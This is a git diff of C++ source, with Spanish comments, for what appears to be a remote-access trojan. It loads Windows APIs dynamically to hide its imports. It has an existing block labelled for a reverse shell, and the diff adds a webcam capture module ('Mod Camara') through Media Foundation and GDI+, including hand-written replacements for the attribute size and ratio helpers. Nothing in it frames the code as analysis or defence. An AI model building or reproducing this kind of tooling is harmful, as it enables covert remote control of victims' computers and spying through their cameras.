@@ -1,6 +1,36 @@
 #include "mod_dynamic_load.hpp"
 #include "misc.hpp"
 
+HRESULT WINAPI MyMFSetAttributeSize(IMFAttributes* pAttributes, REFGUID guidKey, UINT32 width, UINT32 height) {
+    ULONGLONG packed = ((ULONGLONG)width << 32) | height;
+    return pAttributes->SetUINT64(guidKey, packed);
+}
+
+HRESULT WINAPI MyMFGetAttributeSize(IMFAttributes* pAttributes, REFGUID guidKey, UINT32* pWidth, UINT32* pHeight) {
+    ULONGLONG packed;
+    HRESULT hr = pAttributes->GetUINT64(guidKey, &packed);
+    if (SUCCEEDED(hr)) {
+        *pWidth = (UINT32)(packed >> 32);
+        *pHeight = (UINT32)(packed & 0xFFFFFFFF);
+    }
+    return hr;
+}
+
+HRESULT WINAPI MyMFSetAttributeRatio(IMFAttributes* pAttributes, REFGUID guidKey, UINT32 num, UINT32 den) {
+    ULONGLONG packed = ((ULONGLONG)num << 32) | den;
+    return pAttributes->SetUINT64(guidKey, packed);
+}
+
+HRESULT WINAPI MyMFGetAttributeRatio(IMFAttributes* pAttributes, REFGUID guidKey, UINT32* pNum, UINT32* pDen) {
+    ULONGLONG packed;
+    HRESULT hr = pAttributes->GetUINT64(guidKey, &packed);
+    if (SUCCEEDED(hr)) {
+        *pNum = (UINT32)(packed >> 32);
+        *pDen = (UINT32)(packed & 0xFFFFFFFF);
+    }
+    return hr;
+}
+
 DynamicLoad::DynamicLoad() {
     //Cargar dlls y funciones
     LOAD_DLL(this->hKernel32DLL, "kernel32.dll");
@@ -27,6 +57,10 @@ DynamicLoad::DynamicLoad() {
         //Reverse shell
         this->KERNEL32.pCreatePipe = (st_Kernel32::LPCREATEPIPE)wrapGetProcAddr(this->hKernel32DLL, "CreatePipe");
         this->KERNEL32.pPeekNamedPipe = (st_Kernel32::LPPEEKNAMEDPIPE)wrapGetProcAddr(this->hKernel32DLL, "PeekNamedPipe");
+
+        //Mod Camara
+        this->KERNEL32.pGlobalAlloc = (st_Kernel32::LPGLOBALALLOC)wrapGetProcAddr(this->hKernel32DLL, "GlobalAlloc");
+        this->KERNEL32.pGlobalFree = (st_Kernel32::LPGLOBALFREE)wrapGetProcAddr(this->hKernel32DLL, "GlobalFree");
 
     }
 
@@ -249,11 +283,9 @@ void DynamicLoad::LoadCamProcs() {
     if (this->hGdiPlusDLL) {
         this->GDIPLUS_RD.pGdiplusStartup = (st_GdiPlus::LPGDIPLUSSTARTUP)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusStartup");
         this->GDIPLUS_RD.pGdiplusShutdown = (st_GdiPlus::LPGDIPLUSSHUTDOWN)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusShutdown");
-        //this->GDIPLUS_RD.pGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GetImageEncodersSize");  Gdiplus wrapper
-        this->GDIPLUS_RD.pGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncodersSize");  // Flat api
-        //this->GDIPLUS_RD.pGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GetImageEncoders");
-        this->GDIPLUS_RD.pGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncoders"); //flat Api
-        this->GDIPLUS_RD.pFromStream = (st_GdiPlus::LPFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "FromStream");
+        this->GDIPLUS_RD.pGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncodersSize");
+        this->GDIPLUS_RD.pGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncoders");
+        this->GDIPLUS_RD.pFromStream = (st_GdiPlus::LPFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "FromStream"); // No carga
 		this->GDIPLUS_RD.pGdipSaveImageToStream = (st_GdiPlus::LPGDIPSAVEIMAGETOSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipSaveImageToFile");
     }
 
@@ -269,14 +301,8 @@ void DynamicLoad::LoadCamProcs() {
         this->MFPLAT.pMFCreateMediaType = (st_Mfplat::LPMFCREATEMEDIATYPE)wrapGetProcAddr(this->hMfplatDLL, "MFCreateMediaType");
         this->MFPLAT.pMFCreateSample = (st_Mfplat::LPMFCREATESAMPLE)wrapGetProcAddr(this->hMfplatDLL, "MFCreateSample");
         this->MFPLAT.pMFCreateMemoryBuffer = (st_Mfplat::LPMFCREATEMEMORYBUFFER)wrapGetProcAddr(this->hMfplatDLL, "MFCreateMemoryBuffer");
-
-        //MFapi
-        this->MFAPI.pMFGetAttributeSize = (st_Mfapi::LPMFGETATTRIBUTESIZE)wrapGetProcAddr(this->hMfplatDLL, "MFGetAttributeSize");
-        this->MFAPI.pMFGetAttributeRatio = (st_Mfapi::LPMFGETATTRIBUTERATIO)wrapGetProcAddr(this->hMfplatDLL, "MFGetAttributeRatio");
-        this->MFAPI.pMFSetAttributeRatio = (st_Mfapi::LPMFSETATTRIBUTERATIO)wrapGetProcAddr(this->hMfplatDLL, "MFSetAttributeRatio");
-        this->MFAPI.pMFSetAttributeSize = (st_Mfapi::LPMFSETATTRIBUTESIZE)wrapGetProcAddr(this->hMfplatDLL, "MFSetAttributeSize");
     }
-
+    
     if (this->hMfDLL) {
         this->MF.pMFEnumDeviceSources = (st_Mf::LPMFENUMDEVICESOURCES)wrapGetProcAddr(this->hMfDLL, "MFEnumDeviceSources");
     }
